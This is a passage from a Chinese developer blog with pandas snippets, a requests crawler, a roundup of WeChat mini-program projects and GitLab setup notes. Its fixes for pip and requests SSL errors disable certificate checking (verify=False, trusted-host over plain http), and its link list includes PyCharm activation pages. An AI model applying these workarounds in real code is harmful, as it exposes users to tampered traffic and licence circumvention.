<span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"> #读取csv</span><br><span class="line"> df = pd.read_csv(<span class="string">'xxx.csv'</span>)</span><br><span class="line"></span><br><span class="line"> #pkl格式https://learnku.com/articles/39739</span><br><span class="line"> df.to_pickle('xxx.pkl') #格式另存</span><br><span class="line"> df = pd.read_pickle('xxx.pkl') #读取</span><br><span class="line"></span><br><span class="line"> #hdf格式</span><br><span class="line">df.to_hdf('xxx.hdf','df') #格式另存</span><br><span class="line">df = pd.read_hdf('xxx.pkl','df') #读取</span><br><span class="line"></span><br><span class="line">boolean=[True,False]</span><br><span class="line">gender=[<span class="string">"男"</span>,<span class="string">"女"</span>]</span><br><span class="line">color=[<span class="string">"white"</span>,<span class="string">"black"</span>,<span class="string">"yellow"</span>]</span><br><span class="line">data=pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">"height"</span>:np.random.randint(<span class="number">150</span>,<span class="number">190</span>,<span class="number">100</span>),</span><br><span class="line">    <span class="string">"weight"</span>:np.random.randint(<span class="number">40</span>,<span class="number">90</span>,<span class="number">100</span>),</span><br><span class="line">    <span class="string">"smoker"</span>:[boolean[x] <span class="keyword">for</span> x <span class="keyword">in</span> np.random.randint(<span class="number">0</span>,<span class="number">2</span>,<span class="number">100</span>)],</span><br><span class="line">    <span class="string">"gender"</span>:[gender[x] <span class="keyword">for</span> x <span class="keyword">in</span> np.random.randint(<span class="number">0</span>,<span class="number">2</span>,<span class="number">100</span>)],</span><br><span class="line">    <span class="string">"age"</span>:np.random.randint(<span class="number">15</span>,<span class="number">90</span>,<span class="number">100</span>),</span><br><span class="line">    <span class="string">"color"</span>:[color[x] <span class="keyword">for</span> x <span class="keyword">in</span> np.random.randint(<span class="number">0</span>,len(color),<span class="number">100</span>) ]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">&gt;&gt;&gt; data</span><br><span class="line">    height  weight  smoker gender  age   color</span><br><span class="line"><span class="number">0</span>      <span class="number">186</span>      <span class="number">77</span>   False      女   <span class="number">59</span>   black</span><br><span class="line"><span class="number">1</span>      <span class="number">162</span>      <span class="number">62</span>   False      女   <span class="number">75</span>  yellow</span><br><span class="line"><span class="number">2</span>      <span class="number">187</span>      <span class="number">78</span>   False      男   <span class="number">66</span>   black</span><br><span class="line"><span class="number">3</span>      <span class="number">166</span>      <span class="number">45</span>    True      男   <span class="number">38</span>   white</span><br><span class="line">#①使用字典进行映射</span><br><span class="line">data[<span class="string">"gender"</span>] = data[<span class="string">"gender"</span>].map(&#123;<span class="string">"男"</span>:<span class="number">1</span>, <span class="string">"女"</span>:<span class="number">0</span>&#125;)</span><br><span class="line"></span><br><span class="line">#②使用函数</span><br><span class="line">def gender_map(x):</span><br><span class="line">    gender = <span class="number">1</span> <span class="keyword">if</span> x == <span class="string">"男"</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> gender</span><br><span class="line">#注意这里传入的是函数名，不带括号</span><br><span class="line">data[<span class="string">"gender"</span>] = data[<span class="string">"gender"</span>].map(gender_map)</span><br><span class="line">def apply_age(x,bias):</span><br><span class="line">    <span class="keyword">return</span> x+bias</span><br><span class="line"></span><br><span class="line">#以元组的方式传入额外的参数</span><br><span class="line">data[<span class="string">"age"</span>] = data[<span class="string">"age"</span>].apply(apply_age,args=(<span class="number">-3</span>,))</span><br><span class="line"># 沿着0轴求和</span><br><span class="line">data[[<span class="string">"height"</span>,<span class="string">"weight"</span>,<span class="string">"age"</span>]].apply(np.sum, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># 沿着0轴取对数</span><br><span class="line">data[[<span class="string">"height"</span>,<span class="string">"weight"</span>,<span class="string">"age"</span>]].apply(np.log, axis=<span class="number">0</span>)</span><br><span class="line">def BMI(series):</span><br><span class="line">    weight = series[<span class="string">"weight"</span>]</span><br><span class="line">    height = series[<span class="string">"height"</span>]/<span class="number">100</span></span><br><span class="line">    BMI = weight/height**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> BMI</span><br><span class="line"></span><br><span class="line">data[<span class="string">"BMI"</span>] = data.apply(BMI,axis=<span class="number">1</span>)</span><br><span class="line">df.applymap(lambda x:<span class="string">"%.2f"</span> % x)</span><br><span class="line">https:<span class="comment">//learnku.com/articles/39734</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: data.groupby(<span class="string">"company"</span>).agg(<span class="string">'mean'</span>)</span><br><span class="line">Out[<span class="number">12</span>]:</span><br><span class="line">         salary    age</span><br><span class="line">company</span><br><span class="line">A         <span class="number">21.50</span>  <span class="number">27.50</span></span><br><span class="line">B         <span class="number">13.00</span>  <span class="number">29.00</span></span><br><span class="line">C         <span class="number">29.25</span>  <span class="number">27.25</span></span><br><span class="line">In [<span class="number">17</span>]: data.groupby(<span class="string">'company'</span>).agg(&#123;<span class="string">'salary'</span>:<span class="string">'median'</span>,<span class="string">'age'</span>:<span class="string">'mean'</span>&#125;)</span><br><span class="line">Out[<span class="number">17</span>]:</span><br><span class="line">         salary    age</span><br><span class="line">company</span><br><span class="line">A          <span class="number">21.5</span>  <span class="number">27.50</span></span><br><span class="line">B          <span class="number">10.0</span>  <span class="number">29.00</span></span><br><span class="line">C          <span class="number">30.0</span>  <span class="number">27.25</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: data[<span class="string">'avg_salary'</span>] = data.groupby(<span class="string">'company'</span>)[<span class="string">'salary'</span>].transform(<span class="string">'mean'</span>)</span><br><span class="line">https:<span class="comment">//learnku.com/articles/39735</span></span><br></pre></td></tr></table></figure>
<h3 id="requests-抓取网页的通用框架"><a href="#requests-抓取网页的通用框架" class="headerlink" title="requests 抓取网页的通用框架"></a>requests 抓取网页的通用框架</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">def getHtmlText(url):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        # 如果状态码不是 200, 则应发 HTTPERROR 异常</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        # 设置正确的编码方式</span><br><span class="line">        response.encoding = response.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something Wrong!"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line"></span><br><span class="line">result = getHtmlText(url)</span><br><span class="line">print(result)</span><br><span class="line">http:<span class="comment">//www.siya89.com/blog/python%20zero</span></span><br></pre></td></tr></table></figure>
<h3 id="Could-not-fetch-URL"><a href="#Could-not-fetch-URL" class="headerlink" title="Could not fetch URL"></a>Could not fetch URL</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> pip install -U requests</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">4</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/</span>requests/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">3</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/</span>requests/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">2</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/</span>requests/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">1</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/</span>requests/</span><br><span class="line">WARNING: Retrying (Retry(total=<span class="number">0</span>, connect=None, read=None, redirect=None, status=None)) after connection broken by <span class="string">'SSLError(SSLCertVerificationError(1, '</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate <span class="keyword">in</span> certificate chain (_ssl.c:<span class="number">1045</span>)<span class="string">'))'</span>: <span class="regexp">/simple/</span>requests/</span><br><span class="line">Could not fetch URL https:<span class="comment">//pypi.org/simple/requests/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/requests/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self signed certificate in certificate chain (_ssl.c:1045)'))) - skipping</span></span><br><span class="line">Requirement already up-to-date: requests <span class="keyword">in</span> d:\python\lib\site-packages (<span class="number">2.21</span><span class="number">.0</span>)</span><br><span class="line">Requirement already satisfied, skipping upgrade: idna&lt;<span class="number">2.9</span>,&gt;=<span class="number">2.5</span> <span class="keyword">in</span> d:\python\lib\site-packages (<span class="keyword">from</span> requests) (<span class="number">2.8</span>)</span><br><span class="line"></span><br><span class="line"> pip --trusted-host pypi.doubanio.com install -U tqdm -i http:<span class="comment">//pypi.doubanio.com/simple</span></span><br><span class="line">Looking <span class="keyword">in</span> indexes: http:<span class="comment">//pypi.doubanio.com/simple</span></span><br><span class="line">Collecting tqdm</span><br><span class="line">  Downloading http:<span class="comment">//pypi.doubanio.com/packages/4a/1c/6359be64e8301b84160f6f6f7936bbfaaa5e9a4eab6cbc681db07600b949/tqdm-4.45.0-py2.py3-none-any.whl (60kB)</span></span><br><span class="line">     |████████████████████████████████| <span class="number">61</span>kB <span class="number">1.9</span>MB/s</span><br><span class="line">Installing collected packages: tqdm</span><br><span class="line">  Found existing installation: tqdm <span class="number">4.28</span><span class="number">.1</span></span><br><span class="line">    Uninstalling tqdm<span class="number">-4.28</span><span class="number">.1</span>:</span><br><span class="line">      Successfully uninstalled tqdm<span class="number">-4.28</span><span class="number">.1</span></span><br><span class="line">Successfully installed tqdm<span class="number">-4.45</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">创建或修改配置文件（linux的文件在~<span class="regexp">/.pip/</span>pip.conf，windows在%HOMEPATH%\pip\pip.ini），修改内容为：</span><br><span class="line"></span><br><span class="line">code:</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http:<span class="comment">//pypi.douban.com/simple</span></span><br></pre></td></tr></table></figure>
<h3 id="Python-Requests-throwing-SSLError"><a href="#Python-Requests-throwing-SSLError" class="headerlink" title="Python Requests throwing SSLError"></a>Python Requests throwing SSLError</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">pip install certifi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">import</span> requests</span><br><span class="line">&gt;&gt;&gt; requests.certs.where()</span><br><span class="line"><span class="string">'D:\\python\\lib\\site-packages\\certifi\\cacert.pem'</span></span><br><span class="line">requests.get(url, verify=False)</span><br><span class="line">cafile = 'cacert.pem' # http://curl.haxx.se/ca/cacert.pem</span><br><span class="line">r = requests.get(url, verify=cafile)</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">"https://api.github.com/events"</span>, verify=True, cert=[<span class="string">'/path/to/my/ca.crt'</span>])</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/10667960/python-requests-throwing-sslerror</span></span><br><span class="line">https:<span class="comment">//requests.readthedocs.io/en/latest/user/advanced/#ssl-cert-verification</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/39732" target="_blank" rel="noopener">Python 数据分析实战 | 用数据带你回顾乔丹的职业生涯</a></p>
<p><a href="https://learnku.com/articles/39640" target="_blank" rel="noopener">Python 包的创建</a></p>
<p><a href="https://learnku.com/python/t/38853" target="_blank" rel="noopener">Flask 和 ChatterBot 构建聊天机器人</a></p>
<p><a href="https://learnku.com/python/t/38748" target="_blank" rel="noopener">小项目来学习 Flask</a></p>
<p><a href="https://learnku.com/python/t/38740" target="_blank" rel="noopener">Flask 项目结构分享</a></p>
<p><a href="https://github.com/hk029/christmas-hat" target="_blank" rel="noopener">纯前端实现人脸识别自动佩戴圣诞帽</a></p>
<p><a href="https://mp.weixin.qq.com/s/_nmpXZY9ctBSnCVdgy0KLA" target="_blank" rel="noopener">python flask 微信机器人</a></p>
<p><a href="https://github.com/Foair/course-crawler" target="_blank" rel="noopener">中国大学MOOC、学堂在线、网易云课堂、好大学在线、爱课程 MOOC 课程下载。</a></p>
<p><a href="https://www.yingjoy.cn/numpy-100-1/" target="_blank" rel="noopener">100个Numpy练习</a></p>
<p><a href="https://learnku.com/articles/36218" target="_blank" rel="noopener">Python 图文识别</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTQ4NjA3Nw==&amp;mid=2459679291&amp;idx=1&amp;sn=c5062f89f10f12d9cb2bfb3132f3555f&amp;chksm=b1dbc32986ac4a3f67a09e1afd20337c439b84a81df54c34166d8387b7dce6899091f5a5fa52&amp;mpshare=1&amp;scene=21&amp;srcid=0108BeXqtj8pQ4Fjor6Q5x9i&amp;from=timeline&amp;ascene=2&amp;devicetype=android-19&amp;version=27000038&amp;nettype=WIFI&amp;abtest_cookie=BQABAAoACwASABMAFAAGACOXHgBXmR4Am5keAJ2ZHgCjmR4As5keAAAA&amp;lang=zh_CN&amp;pass_ticket=os0oh%20IZdLx%20aDsZPG7o00lQN1g5c4hQqPsbtpOn4Hie5oswKrr7aOHXbRHTMWMP&amp;wx_header=1#wechat_redirect" target="_blank" rel="noopener">学Python前请你先看看这个文章！</a></p>
<p><a href="https://github.com/eastlakeside/interpy-zh" target="_blank" rel="noopener">Python进阶书籍</a></p>
<p><a href="https://github.com/mozilla/readability" target="_blank" rel="noopener">新闻类网站通用抽取器 https://github.com/kingname/GeneralNewsExtractor </a></p>
<p><a href="https://zhuanlan.zhihu.com/p/70039605" target="_blank" rel="noopener">用Python把公众号文章打包成pdf文件</a></p>
<p><a href="http://jartto.wang/2018/12/31/f2e-2018/" target="_blank" rel="noopener">用 Python 爬取 2018 前端热点</a></p>
<p><a href="https://oicebot.github.io/2018/09/05/30-mins-into-pandas-for-data-science.html" target="_blank" rel="noopener">30分钟带你入门数据分析工具 Pandas</a></p>
<p><a href="http://www.ikeguang.com/2019/08/06/PyCharm2019-register/" target="_blank" rel="noopener">PyCharm2019激活</a></p>
<p><a href="https://me.jinchuang.org/archives/280.html" target="_blank" rel="noopener">wkhtmlpdf命令行工具发送微信图片告警</a></p>
<p><a href="https://post.zz173.com/detail/hfu17Yn_YpMY9TlVNTqv8w.html" target="_blank" rel="noopener">Python解密进相亲交流群</a></p>
<p><a href="https://github.com/sweida/python-study/tree/master/videoToCode" target="_blank" rel="noopener">OpenCV和FFmpeg将普通视频转成代码视频</a></p>
<p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/index.html" target="_blank" rel="noopener">python3文档</a></p>
<p><a href="https://learnku.com/articles/31315" target="_blank" rel="noopener">从零开始的 TensorFlow tensorflow.google.cn/</a></p>
<p><a href="https://learnku.com/articles/30542" target="_blank" rel="noopener">Redis 结合 flask 及 vue 实现 SSE 在线聊天</a></p>
<p><a href="http://www.python88.com/user/6732" target="_blank" rel="noopener">Python社区文章</a></p>
<p><a href="http://martinhan.site/2017-04-15/python%E7%89%88-%E6%89%B9%E9%87%8F%E4%B8%AD%E6%96%87%E6%96%87%E4%BB%B6%E5%90%8D%E8%BD%AC%E8%8B%B1%E6%96%87.html" target="_blank" rel="noopener">python版-批量中文文件名转英文</a></p>
<p><a href="https://github.com/xchaoinfo/fuck-login" target="_blank" rel="noopener">模拟登录一些知名的网站，为了方便爬取需要登录的网站fuck login</a></p>
<p><a href="https://finthon.com/data-processing/pandas/" target="_blank" rel="noopener">pandas</a></p>
<p><a href="https://yangfangs.github.io/2018/08/06/python-distribution-packages/" target="_blank" rel="noopener">Python 快速打包发布软件PyPi上</a></p>
<p><a href="https://finthon.com/python-advance/" target="_blank" rel="noopener">Python进阶</a></p>
<p><a href="https://www.restran.net/2015/10/04/supervisord-tutorial/" target="_blank" rel="noopener">Python 进程管理工具 Supervisor 使用教程</a></p>
<p><a href="https://www.restran.net/2017/02/25/python-tutorial-outline/" target="_blank" rel="noopener">Python 入门教程 - 课程大纲</a></p>
<p><a href="">网易云音乐歌曲评论爬虫</a></p>
<p><a href="http://python.jobbole.com/89161/" target="_blank" rel="noopener">爬取豆瓣短评之《后来的我们》</a></p>
<p><a href="https://www.techug.com/post/python-tips-and-trick.html" target="_blank" rel="noopener">python奇技淫巧</a></p>
<p><a href="https://github.com/5alt/ZeroScan" target="_blank" rel="noopener">爆破的方式收集子域名https://5alt.me/tools/</a></p>
<p><a href="https://github.com/CriseLYJ/awesome-python-login-model" target="_blank" rel="noopener">python模拟登陆一些大型网站，还有一些简单的爬虫</a></p>
<p>python 爬虫入门初级篇 <a href="https://piaosanlang.gitbooks.io/spiders/content/01day/README1.html" target="_blank" rel="noopener">https://piaosanlang.gitbooks.io/spiders/content/01day/README1.html</a></p>
<p>python 坦克大战源码 <a href="https://learnku.com/articles/34725" target="_blank" rel="noopener">https://learnku.com/articles/34725</a></p>
<p><a href="https://learnku.com/articles/35053" target="_blank" rel="noopener">pycharm激活码 过期</a></p>
<p><a href="http://www.liujiangblog.com/course/python/1" target="_blank" rel="noopener">python教程</a></p>
<p><a href="https://learnku.com/python/t/35004" target="_blank" rel="noopener">Python 反编译调用有道翻译</a></p>
<p><a href="https://github.com/Bgods/PDF2PNG" target="_blank" rel="noopener">PDF 和图片互转</a></p>
<p><a href="https://learnku.com/articles/35287" target="_blank" rel="noopener">pandas 学习笔记 </a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/25/微信小程序项目收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/25/微信小程序项目收集/" itemprop="url">微信小程序项目收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-25T15:16:04+08:00">
                2019-02-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  346 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="小程序登录流程"><a href="#小程序登录流程" class="headerlink" title="小程序登录流程"></a>小程序登录流程</h3><p><img src="https://iocaffcdn.phphub.org/uploads/images/201903/03/26968/uiTFdowDpC.jpg!large" alt="i"></p>
<h3 id="微信小程序版博客"><a href="#微信小程序版博客" class="headerlink" title="微信小程序版博客"></a>微信小程序版博客</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">软件架构 https:<span class="comment">//learnku.com/articles/24562#topnav</span></span><br><span class="line"></span><br><span class="line">开发工具：微信开发者工具</span><br><span class="line">语言：直接使用原生的</span><br><span class="line">项目地址：https:<span class="comment">//github.com/yanthink/mpblog</span></span><br><span class="line"></span><br><span class="line">小程序后端</span><br><span class="line"></span><br><span class="line">开发工具：PhpStorm</span><br><span class="line">语言：PHP</span><br><span class="line">框架：Laravel <span class="number">5.6</span></span><br><span class="line">数据库：Mysql <span class="number">8.0</span></span><br><span class="line">队列：Redis</span><br><span class="line">全文搜索：Elasticsearch</span><br><span class="line">websocket：Redis + websockets/ws</span><br><span class="line">项目地址：https:<span class="comment">//github.com/yanthink/blog-api</span></span><br><span class="line"></span><br><span class="line">后台管理</span><br><span class="line"></span><br><span class="line">开发工具：WebStorm</span><br><span class="line">语言：JavaScript</span><br><span class="line">框架：ant design pro <span class="number">2.0</span><span class="number">.0</span>-beta<span class="number">.1</span></span><br><span class="line">项目地址：https:<span class="comment">//github.com/yanthink/blog</span></span><br><span class="line"></span><br><span class="line">运维</span><br><span class="line"></span><br><span class="line">反向代理：Nginx <span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">SSL证书：Symantec 免费版</span><br><span class="line">服务器：阿里云轻量级服务器 CentOS <span class="number">7.3</span></span><br></pre></td></tr></table></figure>
<h3 id="知识付费小程序"><a href="#知识付费小程序" class="headerlink" title="知识付费小程序"></a>知识付费小程序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/SmallRuralDog/yundocs</span></span><br><span class="line">yarn global add @tarojs/cli</span><br><span class="line">git clone https:<span class="comment">//github.com/SmallRuralDog/yundocs.git yundocs</span></span><br><span class="line">cd yundocs</span><br><span class="line">yarn install</span><br><span class="line">yarn run dev:weapp</span><br></pre></td></tr></table></figure>
<h3 id="配置小程序前后端"><a href="#配置小程序前后端" class="headerlink" title="配置小程序前后端"></a>配置小程序前后端</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/jc91715/xcx-sina-sae.git project</span></span><br><span class="line">cd project &amp;&amp; npm install</span><br><span class="line">npm run --watch</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/23948</span></span><br></pre></td></tr></table></figure>
<h3 id="小程序社区"><a href="#小程序社区" class="headerlink" title="小程序社区"></a>小程序社区</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//yike.io/</span></span><br><span class="line">前端：https:<span class="comment">//github.com/overtrue/yike.io</span></span><br><span class="line">后端：https:<span class="comment">//github.com/overtrue/api.yike.io</span></span><br><span class="line">视频：https:<span class="comment">//learnku.com/courses/laravel-package/yikeio/2505</span></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/28072#topnav" target="_blank" rel="noopener">整理小程序登录状态维护笔记</a></p>
<p><a href="https://blog.mutoe.com/2019/button-border-in-wechat-miniprogram/" target="_blank" rel="noopener">微信小程序开发问题集锦</a><br>藏头诗微信小程序，表白，祝福，整蛊。还可以抖音去水印。<br>小程序码，微信直接扫一扫打开，或者微信搜：快抖工具箱<br>百度AI体验中心微信小程序<br><a href="https://github.com/foolstack-omg/wepy-image-cropper" target="_blank" rel="noopener">小程序图片裁剪插件</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/22/gitlab-使用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/22/gitlab-使用/" itemprop="url">gitlab 使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-22T11:58:42+08:00">
                2019-01-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  466 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="安装ssh"><a href="#安装ssh" class="headerlink" title="安装ssh"></a>安装ssh</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y curl policycoreutils-pythonopenssh-server</span><br></pre></td></tr></table></figure>
<h3 id="安装postfix"><a href="#安装postfix" class="headerlink" title="安装postfix"></a>安装postfix</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yum install postfix</span><br><span class="line">将postfix服务设置成开机自启动。</span><br><span class="line"></span><br><span class="line">安装命令：sudo systemctl enable postfix</span><br><span class="line"></span><br><span class="line"> 启动postfix。</span><br><span class="line"></span><br><span class="line">安装命令：sudo systemctl start postfix</span><br><span class="line">如出现了错误：</span><br><span class="line">job <span class="keyword">for</span> postfix.service failed. See 